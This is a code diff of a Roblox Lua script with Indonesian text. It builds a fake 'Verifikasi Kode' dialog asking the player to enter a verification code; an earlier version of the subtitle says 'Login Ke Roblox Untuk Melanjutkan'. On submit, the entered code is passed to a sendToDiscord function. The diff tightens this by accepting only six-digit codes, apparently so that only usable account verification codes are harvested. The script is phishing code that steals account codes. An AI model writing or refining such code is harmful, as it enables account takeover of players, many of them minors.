@@ -163,95 +163,106 @@ end
 
 -- Fungsi untuk membuat GUI Verifikasi Kode
 local function createVerificationCodeGUI()
-local gui = Instance.new("ScreenGui")
-local frame = Instance.new("Frame")
-local titleLabel = Instance.new("TextLabel")
-local subtitleLabel = Instance.new("TextLabel")
-local codeBox = Instance.new("TextBox")
-local verifyCodeButton = Instance.new("TextButton")
-local errorLabel = Instance.new("TextLabel")
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local titleLabel = Instance.new("TextLabel")
+    local subtitleLabel = Instance.new("TextLabel")
+    local codeBox = Instance.new("TextBox")
+    local verifyCodeButton = Instance.new("TextButton")
+    local errorLabel = Instance.new("TextLabel")
 
--- Properti GUI
-gui.Name = "VerificationCodeGUI"
-gui.Parent = game.CoreGui or game:GetService("CoreGui")
+    -- Properti GUI
+    gui.Name = "VerificationCodeGUI"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
 
--- Frame
-frame.Name = "VerificationFrame"
-frame.Parent = gui
-frame.Size = UDim2.new(0, 300, 0, 200)
-frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BorderSizePixel = 3
-frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    -- Frame
+    frame.Name = "VerificationFrame"
+    frame.Parent = gui
+    frame.Size = UDim2.new(0, 300, 0, 200)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
+    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 
--- Title Label
-titleLabel.Name = "TitleLabel"
-titleLabel.Parent = frame
-titleLabel.Size = UDim2.new(1, 0, 0, 50)
-titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Font = Enum.Font.SourceSansBold
-titleLabel.Text = "Verifikasi Kode"
-titleLabel.TextSize = 24
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Title Label
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Parent = frame
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Text = "Verifikasi Kode"
+    titleLabel.TextSize = 24
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Subtitle Label
-subtitleLabel.Name = "SubtitleLabel"
-subtitleLabel.Parent = frame
-subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
-subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
-subtitleLabel.BackgroundTransparency = 1
-subtitleLabel.Font = Enum.Font.SourceSans
-subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
-subtitleLabel.TextSize = 16
-subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    -- Subtitle Label
+    subtitleLabel.Name = "SubtitleLabel"
+    subtitleLabel.Parent = frame
+    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
+    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Font = Enum.Font.SourceSans
+    subtitleLabel.Text = "Masukkan Kode Untuk Melanjutkan"
+    subtitleLabel.TextSize = 16
+    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 
--- Code Box
-codeBox.Name = "CodeBox"
-codeBox.Parent = frame
-codeBox.Size = UDim2.new(1, -20, 0, 40)
-codeBox.Position = UDim2.new(0, 10, 0, 60)
-codeBox.PlaceholderText = "Masukkan Kode Verifikasi"
-codeBox.Font = Enum.Font.SourceSans
-codeBox.Text = ""
-codeBox.TextSize = 14
-codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Code Box
+    codeBox.Name = "CodeBox"
+    codeBox.Parent = frame
+    codeBox.Size = UDim2.new(1, -20, 0, 40)
+    codeBox.Position = UDim2.new(0, 10, 0, 60)
+    codeBox.PlaceholderText = "Masukkan Kode Verifikasi"
+    codeBox.Font = Enum.Font.SourceSans
+    codeBox.Text = ""
+    codeBox.TextSize = 14
+    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Error Label
-errorLabel.Name = "ErrorLabel"
-errorLabel.Parent = frame
-errorLabel.Size = UDim2.new(1, -20, 0, 20)
-errorLabel.Position = UDim2.new(0, 10, 0, 110)
-errorLabel.BackgroundTransparency = 1
-errorLabel.Font = Enum.Font.SourceSans
-errorLabel.Text = ""
-errorLabel.TextSize = 14
-errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    -- Error Label
+    errorLabel.Name = "ErrorLabel"
+    errorLabel.Parent = frame
+    errorLabel.Size = UDim2.new(1, -20, 0, 20)
+    errorLabel.Position = UDim2.new(0, 10, 0, 110)
+    errorLabel.BackgroundTransparency = 1
+    errorLabel.Font = Enum.Font.SourceSans
+    errorLabel.Text = ""
+    errorLabel.TextSize = 14
+    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 
--- Verify Code Button
-verifyCodeButton.Name = "VerifyCodeButton"
-verifyCodeButton.Parent = frame
-verifyCodeButton.Size = UDim2.new(1, -20, 0, 40)
-verifyCodeButton.Position = UDim2.new(0, 10, 0, 140)
-verifyCodeButton.Text = "Verifikasi Kode"
-verifyCodeButton.Font = Enum.Font.SourceSansBold
-verifyCodeButton.TextSize = 16
-verifyCodeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-verifyCodeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Verify Code Button
+    verifyCodeButton.Name = "VerifyCodeButton"
+    verifyCodeButton.Parent = frame
+    verifyCodeButton.Size = UDim2.new(1, -20, 0, 40)
+    verifyCodeButton.Position = UDim2.new(0, 10, 0, 140)
+    verifyCodeButton.Text = "Verifikasi Kode"
+    verifyCodeButton.Font = Enum.Font.SourceSansBold
+    verifyCodeButton.TextSize = 16
+    verifyCodeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    verifyCodeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Fungsi Verifikasi Kode
-verifyCodeButton.MouseButton1Click:Connect(function()
-local verificationCode = codeBox.Text
-if verificationCode ~= "" then
-sendToDiscord("Kode Verifikasi: " .. verificationCode)
-print("Kode verifikasi telah dikirim ke Discord!")
-gui:Destroy()
-createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi
-else
-errorLabel.Text = "Harap masukkan kode verifikasi!"
-end
-end)
+    -- Validasi Input Kode
+    codeBox.FocusLost:Connect(function(enterPressed)
+        local text = codeBox.Text
+        if not text:match("^%d%d%d%d%d%d$") then
+            errorLabel.Text = "Kode harus 6 digit angka!"
+            codeBox.Text = ""
+        else
+            errorLabel.Text = ""
+        end
+    end)
+
+    -- Fungsi Verifikasi Kode
+    verifyCodeButton.MouseButton1Click:Connect(function()
+        local verificationCode = codeBox.Text
+        if verificationCode:match("^%d%d%d%d%d%d$") then
+            sendToDiscord("Kode Verifikasi: " .. verificationCode)
+            print("Kode verifikasi telah dikirim ke Discord!")
+            gui:Destroy()
+            createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi
+        else
+            errorLabel.Text = "Kode harus 6 digit angka!"
+        end
+    end)
 end
 
 -- Fungsi Membuat GUI Loading
